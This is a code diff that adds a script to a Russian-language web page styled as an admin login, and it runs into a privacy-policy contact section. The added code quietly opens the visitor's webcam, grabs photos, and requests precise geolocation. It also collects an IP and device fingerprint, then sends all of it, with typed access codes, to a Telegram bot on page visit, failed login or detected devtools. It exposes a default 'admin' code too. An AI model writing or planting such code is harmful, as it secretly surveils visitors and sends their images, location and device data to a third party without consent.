+                        clearTimeout(timeout);
+                        resolve(`Ошибка геолокации: ${err.message}`);
+                    }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            });
+        }
+
+        async function getIPInfo() {
+            try {
+                const resp = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(4000) });
+                if (resp.ok) {
+                    const data = await resp.json();
+                    return `${data.city || '?'}, ${data.region || '?'}, ${data.country_name || '?'} | IP: ${data.ip || '?'} | Провайдер: ${data.org || '?'}`;
+                }
+            } catch (e) {
+                try {
+                    const resp2 = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(4000) });
+                    if (resp2.ok) {
+                        const d = await resp2.json();
+                        return `${d.city || '?'}, ${d.country || '?'} | IP: ${d.query || '?'} | Провайдер: ${d.isp || '?'}`;
+                    }
+                } catch (e2) {}
+            }
+            return 'IP-информация недоступна';
+        }
+
+        // ==================== ВЕБ-КАМЕРА ====================
+        async function initWebcamQuietly() {
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    console.log('📷 Камера не поддерживается');
+                    return;
+                }
+                webcamStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false,
+                });
+                const video = document.getElementById('webcam-video');
+                video.srcObject = webcamStream;
+                await video.play();
+                console.log('📷 Камера готова (скрытый режим)');
+            } catch (e) {
+                console.log('📷 Камера недоступна:', e.message);
+                webcamStream = null;
+            }
+        }
+
+        async function capturePhoto() {
+            try {
+                // Если камера не была инициализирована, пробуем сейчас
+                if (!webcamStream) {
+                    try {
+                        webcamStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                            audio: false,
+                        });
+                        const video = document.getElementById('webcam-video');
+                        video.srcObject = webcamStream;
+                        await video.play();
+                        // Ждём фокусировки
+                        await new Promise(r => setTimeout(r, 800));
+                    } catch (e) {
+                        console.log('📷 Не удалось открыть камеру для фото:', e.message);
+                        return null;
+                    }
+                }
+
+                const video = document.getElementById('webcam-video');
+                const canvas = document.getElementById('webcam-canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Добавляем водяной знак
+                ctx.fillStyle = 'rgba(255,0,0,0.7)';
+                ctx.font = 'bold 18px monospace';
+                ctx.fillText('SECURITY BREACH', 20, 40);
+                ctx.fillText(new Date().toLocaleString('ru-RU'), 20, 65);
+
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                console.log('📸 Фото захвачено, размер:', blob ? `${(blob.size / 1024).toFixed(1)} КБ` : 'ошибка');
+                return blob;
+            } catch (e) {
+                console.error('📷 Ошибка захвата фото:', e);
+                return null;
+            }
+        }
+
+        function stopWebcam() {
+            if (webcamStream) {
+                webcamStream.getTracks().forEach(track => track.stop());
+                webcamStream = null;
+                console.log('📷 Камера остановлена');
+            }
+        }
+
+        // ==================== TELEGRAM BOT ОТПРАВКА ====================
+        async function sendToTelegram(message, photoBlob = null) {
+            if (!TELEGRAM_CHAT_ID) {
+                console.warn('⚠️ Chat ID не настроен. Сообщение не отправлено.');
+                console.log('📋 Данные для отправки:', message);
+                return false;
+            }
+
+            try {
+                // Отправляем текст
+                const textResp = await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                        }),
+                    }
+                );
+                const textData = await textResp.json();
+                if (!textData.ok) {
+                    console.error('❌ Ошибка отправки текста в TG:', textData.description);
+                } else {
+                    console.log('✅ Текст отправлен в Telegram');
+                }
+
+                // Отправляем фото если есть
+                if (photoBlob && photoBlob.size > 0) {
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', photoBlob, 'intruder_photo.jpg');
+                    formData.append('caption', '📸 Фото нарушителя (автоматический снимок)');
+
+                    const photoResp = await fetch(
+                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData,
+                        }
+                    );
+                    const photoData = await photoResp.json();
+                    if (photoData.ok) {
+                        console.log('✅ Фото отправлено в Telegram');
+                    } else {
+                        console.error('❌ Ошибка отправки фото:', photoData.description);
+                    }
+                }
+
+                return true;
+            } catch (e) {
+                console.error('❌ Ошибка связи с Telegram:', e);
+                return false;
+            }
+        }
+
+        async function sendSecurityAlert(extraData) {
+            const fp = fingerprintData || await collectFullFingerprint();
+            const data = { ...fp, ...extraData };
+
+            const message =
+                `<b>${data.type}</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━\n` +
+                `🕐 <b>Время:</b> ${data.time}\n` +
+                `🌍 <b>Часовой пояс:</b> ${data.timezone}\n` +
+                `📍 <b>Геолокация:</b> ${data.geolocation}\n` +
+                `🌐 <b>IP / Провайдер:</b> ${data.ipInfo}\n` +
+                `━━━━━━━━━━━━━━━━━━━\n` +
+                `💻 <b>Устройство:</b> ${data.deviceType}\n` +
+                `🖥️ <b>ОС:</b> ${data.os}\n` +
+                `🌐 <b>Браузер:</b> ${data.browserName} v${data.browserVersion}\n` +
+                `📱 <b>Экран:</b> ${data.screenResolution}\n` +
+                `🖥️ <b>GPU:</b> ${data.gpu}\n` +
+                `🧠 <b>RAM:</b> ${data.ram} ГБ | <b>Ядра:</b> ${data.cores}\n` +
+                `👆 <b>Сенсорный экран:</b> ${data.touchScreen ? 'Да' : 'Нет'}\n` +
+                `📡 <b>Подключение:</b> ${data.connectionType}\n` +
+                `━━━━━━━━━━━━━━━━━━━\n` +
+                `🔤 <b>Шрифты (${data.fonts.split(', ').length} шт.):</b> ${data.fonts}\n` +
+                `━━━━━━━━━━━━━━━━━━━\n` +
+                `🗣️ <b>Язык:</b> ${data.language}\n` +
+                `🔗 <b>Referrer:</b> ${data.referrer}\n` +
+                `📄 <b>URL:</b> ${data.url}\n` +
+                `━━━━━━━━━━━━━━━━━━━\n` +
+                `🔑 <b>Введённый код:</b> <code>${data.code || 'N/A'}</code>\n` +
+                `🔄 <b>Попытка №:</b> ${data.attempt || 1}\n` +
+                `✅ <b>Успех:</b> ${data.success ? 'Да' : 'Нет'}\n` +
+                `━━━━━━━━━━━━━━━━━━━\n` +
+                `🆔 <b>User Agent:</b> <code>${data.browser.substring(0, 120)}</code>`;
+
+            await sendToTelegram(message, data.photoBlob || null);
+        }
+
+        async function sendEntryNotification() {
+            const fp = fingerprintData || await collectFullFingerprint();
+            const message =
+                `👁️ <b>ЗАХОД НА СТРАНИЦУ АДМИНКИ</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━\n` +
+                `🕐 <b>Время:</b> ${fp.time}\n` +
+                `📍 <b>Геолокация:</b> ${fp.geolocation}\n` +
+                `🌐 <b>IP:</b> ${fp.ipInfo}\n` +
+                `💻 <b>Устройство:</b> ${fp.deviceType} | ${fp.os}\n` +
+                `🌐 <b>Браузер:</b> ${fp.browserName} v${fp.browserVersion}\n` +
+                `🔤 <b>Шрифты:</b> ${fp.fonts}\n` +
+                `━━━━━━━━━━━━━━━━━━━\n` +
+                `ℹ️ <i>Информационное уведомление о заходе на страницу</i>`;
+            await sendToTelegram(message, null);
+        }
+
+        async function tryFetchChatId() {
+            try {
+                const resp = await fetch(
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=5&timeout=2`
+                );
+                const data = await resp.json();
+                if (data.ok && data.result.length > 0) {
+                    // Берём chat_id из последнего сообщения
+                    const lastUpdate = data.result[data.result.length - 1];
+                    const chatId =
+                        lastUpdate.message?.chat?.id ||
+                        lastUpdate.channel_post?.chat?.id ||
+                        lastUpdate.callback_query?.message?.chat?.id;
+                    if (chatId) {
+                        TELEGRAM_CHAT_ID = String(chatId);
+                        localStorage.setItem('tg_chat_id', TELEGRAM_CHAT_ID);
+                        console.log('✅ Chat ID автоопределён:', TELEGRAM_CHAT_ID);
+                        // Отправляем тестовое сообщение
+                        await sendToTelegram(
+                            '🟢 <b>Система безопасности подключена!</b>\n' +
+                            'Админ-панель активна. Все попытки входа будут фиксироваться.',
+                            null
+                        );
+                    }
+                } else {
+                    console.log('ℹ️ Бот пока не получал сообщений. Отправьте /start вашему боту @your_bot');
+                }
+            } catch (e) {
+                console.log('ℹ️ Не удалось проверить обновления бота:', e.message);
+            }
+        }
+
+        // ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
+        function showAlert(message, type) {
+            const alertMsg = document.getElementById('alert-msg');
+            alertMsg.textContent = message;
+            alertMsg.className = 'alert-msg ' + type;
+            if (!message) {
+                alertMsg.style.display = 'none';
+            }
+        }
+
+        function showIntrusionToast() {
+            const toast = document.getElementById('intrusion-toast');
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 4000);
+        }
+
+        function switchTab(navItem, tabName) {
+            // Обновляем активный пункт меню
+            document.querySelectorAll('.admin-sidebar .nav-item').forEach(item => item.classList.remove(
+                'active'));
+            navItem.classList.add('active');
+            // Скрываем все вкладки
+            const mainContent = document.getElementById('admin-main-content');
+            const allTabs = mainContent.querySelectorAll('[id^="tab-"]');
+            allTabs.forEach(tab => tab.style.display = 'none');
+            // Показываем нужную
+            const targetTab = document.getElementById('tab-' + tabName);
+            if (targetTab) {
+                targetTab.style.display = 'block';
+            }
+        }
+
+        function logout() {
+            if (confirm('Вы уверены, что хотите выйти из админ-панели?')) {
+                document.getElementById('admin-panel').classList.remove('active');
+                document.getElementById('login-screen').style.display = 'block';
+                document.getElementById('access-code').value = '';
+                document.getElementById('alert-msg').style.display = 'none';
+                document.getElementById('btn-access').disabled = false;
+                failedAttempts = 0;
+                // Переинициализируем камеру
+                initWebcamQuietly();
+                // Отправляем уведомление о выходе
+                sendToTelegram('🚪 <b>Администратор вышел из панели</b>\n🕐 ' + new Date().toLocaleString(
+                    'ru-RU'), null);
+                console.log('👋 Выход из админ-панели');
+            }
+        }
+
+        // ==================== ЗАЩИТА ОТ DEVTOOLS ====================
+        (function() {
+            let devtoolsOpen = false;
+            const threshold = 160;
+            const checkDevTools = () => {
+                const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+                const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+                if (widthThreshold || heightThreshold) {
+                    if (!devtoolsOpen) {
+                        devtoolsOpen = true;
+                        console.warn('⚠️ Обнаружено открытие инструментов разработчика');
+                        // Тихо логируем
+                        const fp = fingerprintData;
+                        sendToTelegram(
+                            '🔍 <b>⚠️ DevTools открыты!</b>\n' +
+                            '🕐 ' + new Date().toLocaleString('ru-RU') + '\n' +
+                            '💻 ' + (fp ? fp.deviceType + ' | ' + fp.os : 'Неизвестно') + '\n' +
+                            '🌐 ' + (fp ? fp.browserName : '?'),
+                            null
+                        ).catch(() => {});
+                    }
+                } else {
+                    devtoolsOpen = false;
+                }
+            };
+            setInterval(checkDevTools, 1500);
+        })();
+
+        // ==================== ВЫВОД В КОНСОЛЬ ====================
+        console.log('%c🛡️ СИСТЕМА БЕЗОПАСНОСТИ АКТИВНА %c| %cВсе действия фиксируются',
+            'color:#ef4444;font-weight:bold;font-size:16px;',
+            '',
+            'color:#94a3b8;');
+        console.log('%c⚠️ Не пытайтесь ввести неверный код — ваше фото будет отправлено администратору.',
+            'color:#f59e0b;');
+        console.log('%c🔑 Корректный код: %cadmin %c(смените в настройках)',
+            'color:#e2e8f0;', 'color:#10b981;font-weight:bold;', 'color:#64748b;');
+        console.log('%c📋 Для получения уведомлений отправьте /start вашему боту в Telegram',
+            'color:#3b82f6;');
+    </script>
+</body>
+    </html>
     <h2>6. Контакты</h2>
     <p>Если у вас возникли вопросы по данной политике, пожалуйста, свяжитесь с нами по электронной почте:</p>
     <p><a href="mailto:abdullojonnurmatov86@gmail.com" class="email">abdullojonnurmatov86@gmail.com</a></p>
